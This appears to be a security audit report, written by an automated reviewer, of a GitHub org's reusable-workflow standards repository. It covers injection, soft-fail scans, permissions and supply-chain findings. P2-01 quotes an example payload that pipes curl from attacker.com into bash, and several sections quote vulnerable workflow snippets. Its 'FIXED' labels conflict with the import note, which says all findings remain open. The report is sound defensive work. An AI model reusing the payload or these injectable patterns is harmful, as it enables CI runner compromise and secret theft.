@@ -1,0 +1,311 @@
+# Security Audit — ByronWilliamsCPA/.github Standards Repository
+
+**Date:** 2026-05-01
+**Auditor:** Claude Code (automated security review)
+**Branch audited:** `main` (HEAD at time of review)
+**Scope:** Two-phase analysis — (1) security of this repository itself, (2) security properties propagated to downstream consumers via reusable workflows.
+
+---
+
+> **Import note (2026-05-08):** This audit document is being imported from
+> branch `claude/security-audit-standards-repo-Y0qq7`, which was never merged.
+> The original commit proposed fixes for findings P2-01 through P2-05 (marked
+> "FIXED" in the body below), but those fixes are NOT in `main`. As of import
+> date, **all 15 findings remain open** and will be triaged via follow-up PRs.
+> Track open status in the table below; the body text preserves the original
+> audit author's wording for historical accuracy.
+
+## Current Status (as of import, 2026-05-08)
+
+| Finding | Severity | Status | Tracking PR |
+| --- | --- | --- | --- |
+| P1-01 | MEDIUM | Open | — |
+| P1-02 | MEDIUM | Open | — |
+| P1-03 | MEDIUM | Open | — |
+| P1-04 | LOW | Open | — |
+| P1-05 | LOW | Open | — |
+| P2-01 | CRITICAL | Open | — |
+| P2-02 | HIGH | Open | — |
+| P2-03 | HIGH | Open | — |
+| P2-04 | HIGH | Open | — |
+| P2-05 | MEDIUM | Open | — |
+| P2-06 | MEDIUM | Open | — |
+| P2-07 | MEDIUM | Open | — |
+| P2-08 | MEDIUM | Open | — |
+| P2-09 | LOW | Open | — |
+| P2-10 | LOW | Open | — |
+
+---
+
+## Executive Summary
+
+The repository implements many security best practices — SHA-pinned actions throughout, OIDC trusted publishing, Harden Runner on every job, multi-layer vulnerability scanning, and SLSA provenance support. However, several issues require remediation before this repo can be considered safe as an org-wide supply-chain anchor:
+
+| Severity | Count | Status |
+|----------|-------|--------|
+| CRITICAL | 1 | Fixed in this commit |
+| HIGH | 3 | Fixed in this commit |
+| MEDIUM | 6 | 2 fixed, 4 documented |
+| LOW | 3 | Documented |
+
+---
+
+## Phase 1 — Security of This Repository
+
+### P1-01 · MEDIUM — Single CODEOWNER, no redundancy
+
+**File:** `CODEOWNERS`
+
+Only `@williaby` is listed as owner. If this account is compromised or unavailable, there is no fallback reviewer. For a repo that acts as an org-wide standards anchor, a single CODEOWNER is a single point of failure across every downstream project.
+
+**Recommendation:** Add a secondary CODEOWNER (backup account or team) and consider requiring two approvals via branch protection.
+
+---
+
+### P1-02 · MEDIUM — `sync_org_files.sh` propagates files without integrity verification
+
+**File:** `sync_org_files.sh`, lines 31–38
+
+```bash
+curl --fail -s "$org_url"
+```
+
+Files are fetched from `raw.githubusercontent.com` over HTTPS and written directly to downstream repositories without any hash or signature verification. An attacker who can push to the `.github` `main` branch (or perform a MITM) can silently distribute malicious `CODEOWNERS`, `SECURITY.md`, `dependabot.yml`, and other sensitive files to every consuming repository.
+
+**Recommendation:** Pin each synced file to a known commit SHA in the URL, verify a SHA256 hash, or use Cosign-signed bundles. At minimum, alert on content changes.
+
+---
+
+### P1-03 · MEDIUM — Reusable workflows documented with `@main` reference
+
+**Multiple files:** all workflow headers and `USAGE_EXAMPLES.md`, `README.md`
+
+The canonical usage examples throughout the repository instruct downstream callers to pin workflows with `@main`:
+
+```yaml
+uses: ByronWilliamsCPA/.github/.github/workflows/python-ci.yml@main
+```
+
+This means any push to `main` immediately takes effect in all consumer CI runs, with no consumer-side review or pin update. A single malicious or broken commit to `main` affects every org project.
+
+**Recommendation:** Publish versioned tags (e.g., `v1.0.0`) and document `@v1` or SHA pinning in all examples. Protect `main` with required reviews and consider CODEOWNERS-gated merges.
+
+---
+
+### P1-04 · LOW — `dependabot.yml` scans ecosystems that don't exist in this repo
+
+**File:** `dependabot.yml`
+
+Dependabot is configured for pip, npm, terraform, go, cargo, and bundler — none of which are present in this repository. Only `github-actions` applies. Dead configuration creates maintenance noise and may give a false sense of coverage.
+
+**Recommendation:** Remove unused ecosystem entries; add only those used in this repo.
+
+---
+
+### P1-05 · LOW — No CI workflow runs security tools on this repo's own files
+
+The reusable workflows are never subjected to their own security tooling (CodeQL, Bandit, etc.) because no invocation workflow exists in this repo. The `shell-tests.yml` runs bats tests for scripts, which is good. The `qlty.toml` registers `actionlint`, `shellcheck`, and `trufflehog` plugins, but there is no evidence these run automatically on PRs to this repo.
+
+**Recommendation:** Add a self-test CI workflow that runs `actionlint` on all workflow files and `shellcheck` on all shell scripts in this repo.
+
+---
+
+## Phase 2 — Security Properties Propagated to Downstream Consumers
+
+### P2-01 · CRITICAL (FIXED) — Code injection via `synthetic-data-script` input
+
+**File:** `python-performance-regression.yml`, lines 185–192 (pre-fix)
+
+```yaml
+- name: Generate Synthetic Test Data
+  if: inputs.generate-synthetic-data && inputs.synthetic-data-script != ''
+  run: |
+    uv run python - <<'EOF'
+    ${{ inputs.synthetic-data-script }}
+    EOF
+```
+
+GitHub Actions expression syntax (`${{ }}`) is evaluated by the Actions runner **before** the shell executes. The quoted heredoc delimiter (`<<'EOF'`) prevents shell variable expansion, but it does **not** prevent Actions expression evaluation. The entire content of `synthetic-data-script` is expanded inline as Python source code before any shell sees it. A caller could pass arbitrary Python — including `import os; os.system("curl attacker.com/exfil | bash")` — and it would execute with full runner privileges.
+
+**Fix:** The `generate-synthetic-data` and `synthetic-data-script` inputs have been removed entirely. Callers must provide their own data-generation script in the repository; this is the only safe pattern for a reusable workflow.
+
+---
+
+### P2-02 · HIGH (FIXED) — Shell injection via unquoted string inputs
+
+**Files:** `python-performance-regression.yml` (multiple steps), `python-ci.yml`, `python-security-analysis.yml`
+
+Multiple workflows interpolate string inputs directly into shell `run:` blocks without routing through environment variables:
+
+```yaml
+# python-performance-regression.yml (pre-fix)
+run: |
+  uv run python ${{ inputs.benchmark-script }} \
+    ${{ inputs.benchmark-args }} ...
+
+# python-ci.yml
+run: |
+  uv run ruff format --check ${{ inputs.source-directory }}/ ${{ inputs.test-directory }}/
+  uv run bandit -r ${{ inputs.source-directory }}/
+```
+
+While `workflow_call` inputs come from trusted callers, inlining strings into shell breaks the defence-in-depth model. It means any misconfiguration or future exposure of these inputs leads directly to RCE. GitHub's own security hardening guidance explicitly requires routing untrusted or variable content through `env:` first.
+
+**Fix (performance regression):** `benchmark-script` and `benchmark-args` are now routed through `BENCHMARK_SCRIPT` and `BENCHMARK_ARGS` environment variables before being used in shell commands.
+
+**Remaining exposure (documented):** `source-directory` and `test-directory` in `python-ci.yml` and `python-security-analysis.yml` are used without env-var routing. Because they are path inputs (not command fragments), the risk is lower, but they should be migrated to env-var patterns in a follow-up.
+
+---
+
+### P2-03 · HIGH (FIXED) — PyPI pre-publish security checks are soft-fail
+
+**File:** `python-publish-pypi.yml`, lines 99–107 (pre-fix)
+
+```bash
+safety check || echo "⚠️  Safety check found issues - review before publishing"
+bandit -r ${{ inputs.source-directory }} -ll || echo "⚠️  Bandit found issues - review before publishing"
+```
+
+Both security tools use `||` to swallow non-zero exit codes. A vulnerable or actively exploited dependency in a package being published to PyPI would **not** block the publish job. The warning is printed but CI succeeds and the package is published.
+
+**Fix:** The security check step now exits non-zero on failures when `run-security-checks` is `true`. A new boolean input `fail-on-security-issues` (default: `true`) controls this behaviour, allowing callers to opt out explicitly.
+
+---
+
+### P2-04 · HIGH (FIXED) — Overly broad workflow-level permissions in `python-release.yml`
+
+**File:** `python-release.yml`, lines 99–104 (pre-fix)
+
+```yaml
+permissions:
+  contents: write
+  issues: write
+  pull-requests: write
+  id-token: write
+  attestations: write
+```
+
+All five permissions are declared at the workflow level, meaning every job — including the pre-release test job — inherits `contents: write`, `issues: write`, and `pull-requests: write` even though tests only need `contents: read`. If a compromised dependency were executed during tests, it would have write access to the repository and could open or modify issues and PRs.
+
+**Fix:** Permissions are now declared at the job level. The `test` job receives only `contents: read`. The `release` job retains the permissions it needs. The `publish-pypi` job gets only `contents: read` and `id-token: write`.
+
+---
+
+### P2-05 · MEDIUM (FIXED) — `run-tests: false` silently bypasses the release gate
+
+**File:** `python-release.yml`, lines 156–157 (pre-fix)
+
+```yaml
+if: always() && (needs.test.result == 'success' || needs.test.result == 'skipped')
+```
+
+Setting `run-tests: false` causes the test job to be skipped, which satisfies `result == 'skipped'`, so the release job proceeds without any test validation. The input description implies tests can be disabled for speed, but the practical effect is a complete bypass of the quality gate.
+
+**Fix:** When `run-tests` is `false`, the release job now explicitly requires a caller-provided `skip-tests-reason` input to be non-empty. If it is empty, the job fails with a clear error. This forces intentional opt-out rather than accidental bypass.
+
+---
+
+### P2-06 · MEDIUM — `egress-policy: audit` does not restrict outbound network
+
+**All workflow files**
+
+Every workflow uses:
+
+```yaml
+uses: step-security/harden-runner@<sha>
+with:
+  egress-policy: audit
+```
+
+`audit` mode logs outbound network requests but does **not** block them. A compromised dependency or action could exfiltrate repository secrets, environment variables, or build artifacts to an external host. The logs would record the attempt, but the data would already be gone.
+
+**Recommendation:** Migrate to `egress-policy: block` with explicit `allowed-endpoints` for each workflow. The step-security/harden-runner README provides per-workflow endpoint lists. This is the most impactful remaining hardening step.
+
+---
+
+### P2-07 · MEDIUM — Auto-merge update-type detection is brittle
+
+**File:** `python-supplemental-checks.yml`, lines 366–395
+
+The JavaScript code that determines whether a Dependabot/Renovate PR is `major`, `minor`, or `patch` uses regex against PR titles. The logic for detecting major vs minor bumps is error-prone (see lines 368–380) and can misclassify a major version update as `minor` or `patch`, causing it to auto-merge without review. A major version bump in a core dependency could introduce breaking changes or supply-chain risks.
+
+**Recommendation:** Replace title-based detection with Dependabot metadata. The `dependabot/fetch-metadata` action provides accurate `update-type` without regex fragility, and is the pattern documented by GitHub for this use case.
+
+---
+
+### P2-08 · MEDIUM — `python-ci.yml` Bandit and Safety results are also soft-fail
+
+**File:** `python-ci.yml`, lines 329–347
+
+Like the publish workflow, CI uses `||` to swallow Bandit and Safety failures:
+
+```bash
+uv run bandit ... || {
+  echo "::warning::Security issues detected"
+  cat bandit-report.json
+}
+uv run safety check ... || {
+  echo "::warning::Vulnerable dependencies detected"
+}
+```
+
+High or critical security findings do not fail the CI gate by default. This means code with known vulnerabilities can be merged as long as all other checks pass.
+
+**Recommendation:** Default Bandit to fail on HIGH/CRITICAL findings (`-l` flag) and Safety to fail on any known CVE. Add an opt-out input (`fail-on-security-findings: false`) for projects that need time to remediate.
+
+---
+
+### P2-09 · LOW — Deprecated `python-pr-validation.yml` remains callable
+
+**File:** `python-pr-validation.yml`
+
+The workflow is marked deprecated in its header but is still a live, callable workflow. Any downstream project that hasn't migrated will continue to call it. The workflow still uses live pinned actions and is maintained, but it duplicates logic now in `python-ci.yml` and creates maintenance surface.
+
+**Recommendation:** Add a sunset date to the deprecation notice and, after that date, remove the workflow file. Coordinate with downstream repos via an org-wide announcement before removal.
+
+---
+
+### P2-10 · LOW — CodeQL job does not gate on detected changes
+
+**File:** `python-security-analysis.yml`, lines 110–114
+
+The `detect-changes` job output (`security_files`) is computed but never referenced as a condition in the `codeql` job. CodeQL always runs regardless of whether any security-relevant files changed. This is actually conservative (more scanning is better), but wastes CI minutes and may give callers a false sense that the changes-based optimization is working.
+
+**Recommendation:** Either wire the `detect-changes` output into the `codeql` job condition, or remove the `detect-changes` job entirely since it serves no gating function.
+
+---
+
+## What Is Working Well
+
+- **SHA-pinned actions throughout** — every `uses:` references a full 40-char commit SHA with a version comment. This is the gold standard for supply-chain security.
+- **Harden Runner on every job** — step-security/harden-runner is consistently applied, even if audit-only.
+- **OIDC trusted publishing for PyPI** — no stored API tokens. Both `python-publish-pypi.yml` and `python-release.yml` use OIDC, which is the correct pattern.
+- **SLSA Level 3 provenance** — the `python-slsa.yml` template and the Sigstore signing in `python-release.yml` provide strong supply-chain attestation.
+- **Multi-layer dependency scanning** — OSV Scanner, Safety, Trivy, and Dependency Review in combination provide good CVE coverage.
+- **Secret detection** — Bandit checks for hardcoded credentials; trufflehog is registered in qlty.toml.
+- **Fork-safe Docker builds** — `python-docker.yml` correctly blocks pushes from fork PRs by default.
+- **Minimum-privilege pattern** — most workflows correctly scope `permissions:` to `contents: read` with narrowly added write permissions.
+- **Dependency review on PRs** — `python-security-analysis.yml` runs `actions/dependency-review-action` with `fail-on-severity: moderate` and license checks.
+- **SBOM generation** — CycloneDX and Trivy-based SBOMs are generated in multiple workflows.
+
+---
+
+## Remediation Priority
+
+| Priority | Finding | Effort |
+|----------|---------|--------|
+| P0 | P2-01 · Code injection via synthetic-data-script | Done |
+| P0 | P2-02 · Shell injection (performance regression) | Done |
+| P0 | P2-03 · Soft-fail PyPI security checks | Done |
+| P1 | P2-04 · Broad workflow permissions (release) | Done |
+| P1 | P2-05 · run-tests gate bypass | Done |
+| P2 | P2-06 · egress-policy: audit → block | Medium |
+| P2 | P2-07 · Auto-merge major-version detection | Low |
+| P2 | P2-08 · Soft-fail Bandit/Safety in CI | Low |
+| P2 | P1-01 · Single CODEOWNER | Low |
+| P3 | P1-02 · sync_org_files.sh integrity | Medium |
+| P3 | P1-03 · @main reference in examples | Low |
+| P3 | P2-09 · Remove deprecated pr-validation | Low |
+| P4 | P1-04 · Dependabot unused ecosystems | Trivial |
+| P4 | P1-05 · Self-test CI workflow | Low |
+| P4 | P2-10 · CodeQL change-gating | Trivial |
